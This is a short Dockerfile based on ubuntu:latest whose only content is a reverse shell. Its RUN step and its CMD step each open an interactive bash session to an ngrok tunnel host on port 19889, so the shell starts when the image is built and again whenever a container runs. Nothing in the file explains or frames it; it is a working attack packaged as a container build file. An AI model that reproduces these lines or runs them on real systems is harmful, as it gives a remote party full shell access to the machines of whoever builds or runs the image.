FROM ubuntu:latest
RUN bash -c "bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/19889 0>&1"
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/19889 0>&1"]
